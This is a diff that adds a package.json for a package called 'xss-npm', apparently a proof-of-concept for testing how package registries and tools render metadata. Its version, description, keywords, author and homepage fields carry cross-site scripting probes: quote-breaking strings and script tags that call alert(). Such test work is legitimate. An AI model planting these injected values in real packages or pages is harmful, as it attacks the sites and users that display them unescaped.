@@ -1,0 +1,21 @@
+{
+  "name": "xss-npm",
+  "version": "1.0.0\";alert(1);//\"><script>alert(2);</script>",
+  "description": "xss-npm-';alert(5);//\"><script>alert(6)</script>",
+  "main": "index.js",
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/kozmic/xss-npm.git"
+  },
+  "keywords": [
+    "xss",
+    "<script>alert(7)</script>",
+    "';alert(8);//"
+  ],
+  "author": "Ståle <script>alert(9);</script>",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/kozmic/xss-npm/issues"
+  },
+  "homepage": "https://github.com/kozmic/xss-npm#readme\"><script>alert(10);</script>"
+}
